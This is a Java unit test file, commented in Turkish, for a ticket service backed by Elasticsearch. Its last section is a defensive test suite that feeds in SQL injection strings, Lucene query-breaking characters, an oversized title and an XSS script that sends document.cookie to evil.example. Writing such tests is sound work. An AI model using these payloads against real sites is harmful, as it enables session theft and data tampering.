package com.skaanb.DejaView.service;

import com.skaanb.DejaView.dto.CreateTicketRequest;
import com.skaanb.DejaView.dto.TicketResponse;
import com.skaanb.DejaView.model.TicketDocument;
import com.skaanb.DejaView.model.TicketStatus;
import com.skaanb.DejaView.repository.TicketRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.data.elasticsearch.core.ElasticsearchOperations;
import org.springframework.data.elasticsearch.core.SearchHit;
import org.springframework.data.elasticsearch.core.SearchHits;
import org.springframework.data.elasticsearch.core.query.Query;

import java.time.Instant;
import java.util.List;
import java.util.Optional;
import java.util.function.Consumer;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

// TicketRepository Elasticsearch'e bağlandığı için burada mock'lanıyor;
// gerçek bir ES kümesi olmadan da testler güvenilir şekilde çalışsın diye
// @SpringBootTest yerine saf Mockito unit test tercih edildi.
@ExtendWith(MockitoExtension.class)
public class TicketServiceTest {

    @Mock
    private TicketRepository ticketRepository;

    @Mock
    private ElasticsearchOperations elasticsearchOperations;

    @Mock
    private TicketAnalysisProducer ticketAnalysisProducer;

    @Mock
    private TicketMutationExecutor ticketMutationExecutor;

    private TicketService ticketService;

    @BeforeEach
    void setUp() {
        ticketService = new TicketService(ticketRepository, elasticsearchOperations,
                ticketAnalysisProducer, ticketMutationExecutor);
    }

    @Test
    void testCreateTicket_NewTitle_Success() {
        // Given
        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("Bağlantı Hatası");
        request.setDescription("PostgreSQL sunucusuna bağlanılamadı, port 5432 refused.");
        request.setTags(List.of("db"));

        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(invocation -> invocation.getArgument(0));

        // When
        TicketResponse response = ticketService.createTicket(request, "kaanboldan");

        // Then
        assertNotNull(response);
        assertNotNull(response.getId()); // başlıktan deterministik olarak türetilir
        assertEquals("Bağlantı Hatası", response.getTitle());
        assertEquals("PostgreSQL sunucusuna bağlanılamadı, port 5432 refused.", response.getErrorMessage());
        assertEquals(List.of("db"), response.getAiTags());
        assertEquals("kaanboldan", response.getCreatedBy());
        assertEquals(1, response.getOccurrenceCount());
        assertEquals(TicketStatus.PENDING, response.getStatus());

        ArgumentCaptor<TicketDocument> captor = ArgumentCaptor.forClass(TicketDocument.class);
        verify(ticketRepository).save(captor.capture());
        assertEquals("bağlantı hatası", captor.getValue().getTitleNormalized());
        assertEquals(captor.getValue().getId(), response.getId());

        // Duplicate-merge yolu (TicketMutationExecutor) hiç tetiklenmemeli
        verifyNoInteractions(ticketMutationExecutor);
        // AI analizi kuyruğa gönderilmeli
        verify(ticketAnalysisProducer).enqueueAnalysis(eq(response.getId()), anyString());
    }

    @Test
    void testCreateTicket_SameTitleTwice_ProducesSameDeterministicId() {
        // Given: aynı başlık iki kez oluşturulmaya çalışılsa (deterministik ID sayesinde)
        // aynı ID'yi üretmeli — bu, iki farklı ticket'ın aynı başlıkla var olmasını
        // yapısal olarak engelleyen mekanizma.
        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(invocation -> invocation.getArgument(0));

        CreateTicketRequest request1 = new CreateTicketRequest();
        request1.setTitle("Bağlantı Hatası");
        request1.setDescription("İlk oluşum");

        CreateTicketRequest request2 = new CreateTicketRequest();
        request2.setTitle("bağlantı hatası "); // farklı case + boşluk
        request2.setDescription("İkinci oluşum");

        // When
        String id1 = ticketService.createTicket(request1, "kullanici1").getId();
        String id2 = ticketService.createTicket(request2, "kullanici2").getId();

        // Then
        assertEquals(id1, id2);
    }

    @SuppressWarnings("unchecked")
    @Test
    void testCreateTicket_DuplicateTitle_MergesTagsAndIncrementsOccurrence() {
        // Given: aynı başlıkla daha önce açılmış bir ticket var
        TicketDocument existing = new TicketDocument();
        existing.setId("existing-doc-id");
        existing.setTitle("Bağlantı Hatası");
        existing.setTitleNormalized("bağlantı hatası");
        existing.setAiTags(List.of("db"));
        existing.setOccurrenceCount(1);
        existing.setCreatedBy("ilkKullanici");

        when(ticketRepository.existsById(anyString())).thenReturn(true);
        // TicketMutationExecutor mock'landığı için, service'in verdiği mutator'ı
        // gerçek "existing" nesnesi üzerinde biz uyguluyoruz.
        when(ticketMutationExecutor.mutate(anyString(), any(Consumer.class))).thenAnswer(invocation -> {
            Consumer<TicketDocument> mutator = invocation.getArgument(1);
            mutator.accept(existing);
            return existing;
        });

        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("Bağlantı Hatası");
        request.setDescription("Aynı hata tekrar oluştu.");
        request.setTags(List.of("timeout"));

        // When
        TicketResponse response = ticketService.createTicket(request, "farkliKullanici");

        // Then: yeni bir ticket oluşturulmuyor, mevcut kayıt güncelleniyor
        assertEquals("existing-doc-id", response.getId());
        assertEquals("Bağlantı Hatası", response.getTitle()); // başlık değişmedi
        assertEquals("ilkKullanici", response.getCreatedBy()); // orijinal sahibi değişmedi
        assertEquals(2, response.getOccurrenceCount()); // arttı
        assertEquals(List.of("db", "timeout"), response.getAiTags()); // birleşti
        assertEquals(TicketStatus.PENDING, response.getStatus());

        verify(ticketRepository, never()).save(any(TicketDocument.class));
        verify(ticketAnalysisProducer).enqueueAnalysis(eq("existing-doc-id"), anyString());
    }

    @Test
    void testDeleteTicket_Owner_Success() {
        // Given
        TicketDocument existing = new TicketDocument();
        existing.setId("ticket-1");
        existing.setCreatedBy("kaanboldan");
        existing.setCreatedAt(Instant.now());
        when(ticketRepository.findById("ticket-1")).thenReturn(Optional.of(existing));

        // When
        ticketService.deleteTicket("ticket-1", "kaanboldan", false);

        // Then
        verify(ticketRepository).deleteById("ticket-1");
    }

    @Test
    void testDeleteTicket_Admin_BypassesOwnership() {
        // Given
        TicketDocument existing = new TicketDocument();
        existing.setId("ticket-1");
        existing.setCreatedBy("kaanboldan");
        when(ticketRepository.findById("ticket-1")).thenReturn(Optional.of(existing));

        // When: farklı bir kullanıcı ama admin
        ticketService.deleteTicket("ticket-1", "adminUser", true);

        // Then
        verify(ticketRepository).deleteById("ticket-1");
    }

    @Test
    void testDeleteTicket_ForbiddenUser_ThrowsException() {
        // Given
        TicketDocument existing = new TicketDocument();
        existing.setId("ticket-1");
        existing.setCreatedBy("kaanboldan");
        existing.setCreatedAt(Instant.now());
        when(ticketRepository.findById("ticket-1")).thenReturn(Optional.of(existing));

        // When & Then
        RuntimeException exception = assertThrows(RuntimeException.class, () ->
                ticketService.deleteTicket("ticket-1", "farkli_kullanici", false));

        assertEquals("Bu ticket'ı silme yetkiniz yok", exception.getMessage());
        verify(ticketRepository, never()).deleteById(anyString());
    }

    @Test
    void testDeleteTicket_NotFound_ThrowsException() {
        // Given
        when(ticketRepository.findById("missing")).thenReturn(Optional.empty());

        // When & Then
        assertThrows(RuntimeException.class, () -> ticketService.deleteTicket("missing", "kaanboldan", false));
        verify(ticketRepository, never()).deleteById(anyString());
    }

    @SuppressWarnings("unchecked")
    @Test
    void testResummarizeTicket_EnqueuesAnalysis() {
        // Given
        TicketDocument existing = new TicketDocument();
        existing.setId("ticket-1");
        existing.setErrorMessage("Orijinal hata mesajı");
        existing.setStatus(TicketStatus.COMPLETED);

        when(ticketMutationExecutor.mutate(eq("ticket-1"), any(Consumer.class))).thenAnswer(invocation -> {
            Consumer<TicketDocument> mutator = invocation.getArgument(1);
            mutator.accept(existing);
            return existing;
        });

        // When
        TicketResponse response = ticketService.resummarizeTicket("ticket-1");

        // Then
        assertEquals(TicketStatus.PENDING, response.getStatus());
        verify(ticketAnalysisProducer).enqueueAnalysis("ticket-1", "Orijinal hata mesajı");
    }

    @SuppressWarnings("unchecked")
    @Test
    void testSearchTickets_DelegatesToElasticsearch_NotFullScan() {
        // Given
        TicketDocument doc = new TicketDocument();
        doc.setId("ticket-1");
        doc.setErrorMessage("PostgreSQL connection refused");
        doc.setCreatedBy("kaanboldan");

        SearchHit<TicketDocument> hit = mock(SearchHit.class);
        when(hit.getContent()).thenReturn(doc);

        SearchHits<TicketDocument> searchHits = mock(SearchHits.class);
        when(searchHits.stream()).thenReturn(Stream.of(hit));

        when(elasticsearchOperations.search(any(Query.class), eq(TicketDocument.class)))
                .thenReturn(searchHits);

        // When
        List<TicketResponse> results = ticketService.searchTickets("connection");

        // Then
        assertEquals(1, results.size());
        assertEquals("ticket-1", results.get(0).getId());

        // Filtreleme artık Elasticsearch tarafında yapılıyor;
        // tüm index'in Java tarafına çekilmediğini doğruluyoruz
        verify(ticketRepository, never()).findAll();
    }

    @Test
    void testSearchTickets_BlankQuery_ReturnsAllTickets() {
        // Given
        TicketDocument doc = new TicketDocument();
        doc.setId("ticket-1");
        doc.setCreatedBy("kaanboldan");
        when(ticketRepository.findAll()).thenReturn(List.of(doc));

        // When
        List<TicketResponse> results = ticketService.searchTickets("  ");

        // Then
        assertEquals(1, results.size());
        verify(ticketRepository).findAll();
        verifyNoInteractions(elasticsearchOperations);
    }

    // ==========================================
    // SERVİS ADI (serviceName)
    // ==========================================

    @Test
    void testCreateTicket_IstemcininVerdigiServisAdiKullanilir() {
        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("Ödeme zaman aşımı");
        request.setDescription("Checkout adımında timeout.");
        request.setServiceName("odeme-servisi");

        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        TicketResponse response = ticketService.createTicket(request, "kaanboldan");

        assertEquals("odeme-servisi", response.getServiceName());
    }

    @Test
    void testCreateTicket_ServisAdindakiBosluklarKirpilir() {
        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("Kuyruk doldu");
        request.setDescription("SMS kuyruğu tıkandı.");
        request.setServiceName("   bildirim-servisi   ");

        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        TicketResponse response = ticketService.createTicket(request, "kaanboldan");

        // serviceName Keyword alanı: "odeme" ile "odeme " ayrı servis görünmemeli
        assertEquals("bildirim-servisi", response.getServiceName());
    }

    @Test
    void testCreateTicket_ServisAdiVerilmezseVarsayilanAtanir() {
        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("Servissiz kayıt");
        request.setDescription("Servis alanı gönderilmedi.");

        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        TicketResponse response = ticketService.createTicket(request, "kaanboldan");

        // Eskiden burada sabit "TicketController" yazılıydı
        assertEquals("Manuel Kayıt", response.getServiceName());
    }

    @Test
    void testCreateTicket_BosServisAdiVarsayilanaDuser() {
        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("Boş servis adı");
        request.setDescription("Sadece boşluk gönderildi.");
        request.setServiceName("   ");

        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        TicketResponse response = ticketService.createTicket(request, "kaanboldan");

        assertEquals("Manuel Kayıt", response.getServiceName());
    }

    @Test
    void testCreateTicket_AsiriUzunServisAdiKisaltilir() {
        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("Uzun servis adı");
        request.setDescription("64 karakterden uzun servis adı gönderildi.");
        request.setServiceName("s".repeat(200));

        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        TicketResponse response = ticketService.createTicket(request, "kaanboldan");

        assertEquals(64, response.getServiceName().length());
    }

    // ==========================================
    // GÜVENLİK: ELASTICSEARCH SORGU INJECTION VE KÖTÜCÜL GİRDİ SENARYOLARI
    //
    // TicketRepository/ElasticsearchOperations burada mock'landığı için gerçek
    // bir Elasticsearch sorgusunun tam olarak nasıl yürüdüğünü doğrulayamıyoruz;
    // ama searchTickets/createTicket'ın kötücül girdi karşısında (a) exception
    // fırlatmadığını, (b) girdiyi sorgu YAPISINI değiştiren bir şey olarak değil
    // düz bir DEĞER olarak ele aldığını (query DSL'i .value(pattern) ile tip-güvenli
    // builder'a veriyoruz, string concatenation ile JSON/sorgu gövdesi kurmuyoruz)
    // doğruluyoruz. computeTicketId SHA-256 kullandığı için girdi ne olursa olsun
    // ID üretimi de injection'a karşı doğası gereği bağışık.
    // ==========================================

    @SuppressWarnings("unchecked")
    @Test
    void testSearchTickets_SqlInjectionTarziPayload_CokmedenSorguOlusturur() {
        // Given
        SearchHits<TicketDocument> emptyHits = mock(SearchHits.class);
        when(emptyHits.stream()).thenReturn(Stream.empty());
        when(elasticsearchOperations.search(any(Query.class), eq(TicketDocument.class)))
                .thenReturn(emptyHits);

        String payload = "'; DROP TABLE tickets; --";

        // When & Then
        assertDoesNotThrow(() -> ticketService.searchTickets(payload));
        verify(elasticsearchOperations).search(any(Query.class), eq(TicketDocument.class));
        // Ticket'ların Elasticsearch dışında bir yolla (ör. tüm index çekilerek) hiç
        // taranmadığını doğruluyoruz — arama gerçekten ES sorgusuna delege edilmiş
        verify(ticketRepository, never()).findAll();
    }

    @SuppressWarnings("unchecked")
    @Test
    void testSearchTickets_LuceneOzelKarakterleriIcerenPayload_CokmedenCalisir() {
        // Given: Elasticsearch/Lucene'de özel anlamı olan karakterler
        // (* ? \ " { } [ ] ( ) ^ ~ : /) — sorgu DSL'ini bozmaya çalışan bir deneme
        SearchHits<TicketDocument> emptyHits = mock(SearchHits.class);
        when(emptyHits.stream()).thenReturn(Stream.empty());
        when(elasticsearchOperations.search(any(Query.class), eq(TicketDocument.class)))
                .thenReturn(emptyHits);

        String payload = "*?\\\"{}[]()^~:/ OR *:*";

        // When & Then
        assertDoesNotThrow(() -> ticketService.searchTickets(payload));
        verify(elasticsearchOperations).search(any(Query.class), eq(TicketDocument.class));
    }

    @Test
    void testCreateTicket_SqlInjectionTarziBaslik_LiteralOlarakKaydedilirCokmez() {
        // Given
        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("'; DROP TABLE tickets; --");
        request.setDescription("SQL injection denemesi başlıkta.");

        // When
        TicketResponse response = ticketService.createTicket(request, "kaanboldan");

        // Then: başlık aynen (kaçışsız ama zararsız) saklanıyor, sadece normalize
        // edilmiş (lowercase) hali id üretiminde kullanılıyor
        assertEquals("'; DROP TABLE tickets; --", response.getTitle());
        assertNotNull(response.getId());
    }

    @Test
    void testCreateTicket_ElasticsearchOzelKarakterleriIcerenBaslik_HashIdUretirCokmez() {
        // Given: ID üretimi SHA-256 hash'e dayandığı için, başlıkta hangi karakter
        // olursa olsun (Lucene özel karakterleri dahil) çakışma/çökme olmamalı
        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("*wildcard* \"quoted\" {json} [array] (paren) ^boost~2");
        request.setDescription("Özel karakter testi.");

        // When & Then
        assertDoesNotThrow(() -> {
            TicketResponse response = ticketService.createTicket(request, "kaanboldan");
            assertNotNull(response.getId());
            // 64 hex karakter = SHA-256 hash uzunluğu
            assertEquals(64, response.getId().length());
        });
    }

    @Test
    void testCreateTicket_ScriptTagIcerenAciklama_LiteralOlarakKaydedilir() {
        // Given: XSS tarzı payload — Elasticsearch/backend bunu çalıştırmaz,
        // sadece metin olarak indeksler; render eden taraf escape etmekle yükümlü.
        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("XSS testi");
        request.setDescription("<script>fetch('https://evil.example/steal?c='+document.cookie)</script>");

        TicketResponse response = ticketService.createTicket(request, "kaanboldan");

        assertEquals(
                "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
                response.getErrorMessage());
    }

    @Test
    void testCreateTicket_AsiriUzunBaslik_CokmedenIslenir() {
        // Given: 50.000 karakterlik başlık (DoS/stres tarzı girdi)
        when(ticketRepository.existsById(anyString())).thenReturn(false);
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> i.getArgument(0));

        CreateTicketRequest request = new CreateTicketRequest();
        request.setTitle("a".repeat(50_000));
        request.setDescription("Aşırı uzun başlık stres testi.");

        // When & Then: çökmemeli, hash üretimi sabit uzunlukta kalmalı
        assertDoesNotThrow(() -> {
            TicketResponse response = ticketService.createTicket(request, "kaanboldan");
            assertEquals(64, response.getId().length());
        });
    }

    @Test
    void testCreateTicket_AyniInjectionPayloadIkiKezGonderilirse_TekKayidaBirlesir() {
        // Given: aynı kötücül başlık iki kez gelirse (ör. otomatik saldırı denemesi
        // tekrar tekrar aynı payload'ı gönderiyorsa) duplicate-merge mantığı
        // yine çalışmalı — SQL injection payload'ı da diğer başlıklar gibi
        // deterministik ID üretiminden geçer.
        String payload = "' OR '1'='1' --";

        when(ticketRepository.existsById(anyString()))
                .thenReturn(false) // ilk çağrı: yok
                .thenReturn(true); // ikinci çağrı: artık var

        TicketDocument created = new TicketDocument();
        when(ticketRepository.save(any(TicketDocument.class))).thenAnswer(i -> {
            TicketDocument t = i.getArgument(0);
            created.setId(t.getId());
            created.setTitle(t.getTitle());
            created.setTitleNormalized(t.getTitleNormalized());
            created.setAiTags(t.getAiTags());
            created.setOccurrenceCount(t.getOccurrenceCount());
            created.setCreatedBy(t.getCreatedBy());
            return created;
        });

        CreateTicketRequest request1 = new CreateTicketRequest();
        request1.setTitle(payload);
        request1.setDescription("İlk deneme");

        when(ticketMutationExecutor.mutate(anyString(), any())).thenAnswer(invocation -> {
            java.util.function.Consumer<TicketDocument> mutator = invocation.getArgument(1);
            mutator.accept(created);
            return created;
        });

        // When
        TicketResponse first = ticketService.createTicket(request1, "saldirgan1");

        CreateTicketRequest request2 = new CreateTicketRequest();
        request2.setTitle(payload);
        request2.setDescription("İkinci deneme");
        TicketResponse second = ticketService.createTicket(request2, "saldirgan2");

        // Then: iki ayrı ticket değil, tek kayıt (occurrence artışı)
        assertEquals(first.getId(), second.getId());
        verify(ticketRepository, times(1)).save(any(TicketDocument.class));
    }
}
